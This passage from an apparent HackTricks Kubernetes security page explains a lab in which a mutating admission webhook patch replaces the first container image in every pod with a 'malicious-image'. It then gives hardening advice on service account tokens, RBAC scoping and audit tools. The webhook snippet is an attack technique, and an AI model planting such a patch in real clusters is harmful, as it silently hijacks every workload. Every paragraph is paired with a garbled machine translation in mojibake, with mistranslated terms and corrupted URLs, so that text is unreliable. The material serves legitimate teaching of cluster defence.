æˆ‘ä»¬å°†å±•å¼€åˆšåˆšå‘ç”Ÿçš„äº‹æƒ…ã€‚ æ‚¨æ‰§è¡Œçš„`ã€‚/decloy.sh`è„šæœ¬ï¼Œåˆ›å»ºäº†ä¸€ä¸ªçªå˜çš„webhookå½•å–æ§åˆ¶å™¨ã€‚ çªå˜Webhookæ¥æ”¶å™¨æ§åˆ¶å™¨ä¸­çš„ä»¥ä¸‹çº¿è·¯è´Ÿè´£ä¸Šè¿°ç»“æœã€‚

```
patches = append(patches, patchOperation{
    Op:    "replace",
    Path:  "/spec/containers/0/image",
    Value: "rewanthtammana/malicious-image",
})
```

The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

ä¸Šé¢çš„æ‘˜è¦ç”¨â€œ rewanthtammana/alistimimageâ€ä»£æ›¿äº†æ¯ä¸ªåŠèˆ±ä¸­çš„ç¬¬ä¸€ä¸ªå®¹å™¨å›¾åƒã€‚

## Best Practices

### **Prevent service account token automounting on pods**

### **é˜²æ­¢æœåŠ¡å¸æˆ·ä»¤ç‰Œä¸Šçš„è‡ªåŠ¨å¡«å……åŠèˆ±**

When a pod is being created, it automatically mounts a service account (the default is default service account in the same namespace). Not every pod needs the ability to utilize the API from within itself.

å½“åˆ›å»ºPODæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å®‰è£…æœåŠ¡å¸æˆ·ï¼ˆé»˜è®¤ä¸ºåŒä¸€å‘½åç©ºé—´ä¸­çš„é»˜è®¤æœåŠ¡å¸æˆ·ï¼‰ã€‚ å¹¶éæ¯ä¸ªPODéƒ½éœ€è¦ä»è‡ªèº«å†…éƒ¨ä½¿ç”¨APIçš„èƒ½åŠ›ã€‚

From version 1.6+ it is possible to prevent automounting of service account tokens on pods using automountServiceAccountToken: false. It can be used on service accounts or pods.

ä»1.6+ç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥é˜²æ­¢ä½¿ç”¨AutomountServiceAccountTokenï¼šfalseåœ¨PODSä¸Šè‡ªåŠ¨åŒ–æœåŠ¡å¸æˆ·ä»¤ç‰Œã€‚ å®ƒå¯ä»¥åœ¨æœåŠ¡å¸æˆ·æˆ–è±†èšä¸Šä½¿ç”¨ã€‚

On a service account it should be added like this:\\

åœ¨æœåŠ¡å¸æˆ·ä¸Šåº”è¯¥æ·»åŠ è¿™æ ·çš„æ·»åŠ ï¼š\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

ï¼

It is also possible to use it on the pod:\\

ä¹Ÿå¯ä»¥åœ¨åŠèˆ±ä¸Šä½¿ç”¨å®ƒï¼š\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

ï¼

### **Grant specific users to RoleBindings\ClusterRoleBindings**

### **å°†ç‰¹å®šç”¨æˆ·æˆäºˆè§’è‰²ç¬¦å·\ clusterrolebindings **

When creating RoleBindings\ClusterRoleBindings, make sure that only the users that need the role in the binding are inside. It is easy to forget users that are not relevant anymore inside such groups.

åœ¨åˆ›å»ºè§’è‰²ç¬¦å·\ clusterrolebindingsæ—¶ï¼Œè¯·ç¡®ä¿åªæœ‰åœ¨ç»‘å®šä¸­éœ€è¦è§’è‰²çš„ç”¨æˆ·æ‰èƒ½å†…éƒ¨ã€‚ å¾ˆå®¹æ˜“å¿˜è®°æ­¤ç±»ç»„ä¸­ä¸å†ç›¸å…³çš„ç”¨æˆ·ã€‚

### **Use Roles and RoleBindings instead of ClusterRoles and ClusterRoleBindings**

### **ä½¿ç”¨è§’è‰²å’Œè§’è‰²é¥°é¢ä»£æ›¿ç°‡å’Œç°‡ - è¿æ¥**

When using ClusterRoles and ClusterRoleBindings, it applies on the whole cluster. A user in such a group has its permissions over all the namespaces, which is sometimes unnecessary. Roles and RoleBindings can be applied on a specific namespace and provide another layer of security.

å½“ä½¿ç”¨ç°‡å’Œç°‡é“¾æ¥æ—¶ï¼Œå®ƒé€‚ç”¨äºæ•´ä¸ªç¾¤é›†ã€‚ æ­¤ç±»ç»„ä¸­çš„ç”¨æˆ·åœ¨æ‰€æœ‰åç§°ç©ºé—´ä¸Šéƒ½å…·æœ‰å…¶æƒé™ï¼Œè¿™æœ‰æ—¶æ˜¯ä¸å¿…è¦çš„ã€‚ è§’è‰²å’Œè§’è‰²ç¬¦å·å¯ä»¥åº”ç”¨äºç‰¹å®šçš„åç§°ç©ºé—´ï¼Œå¹¶æä¾›å¦ä¸€å±‚å®‰å…¨æ€§ã€‚

### **Use automated tools**

### **ä½¿ç”¨è‡ªåŠ¨å·¥å…·**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **References**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>
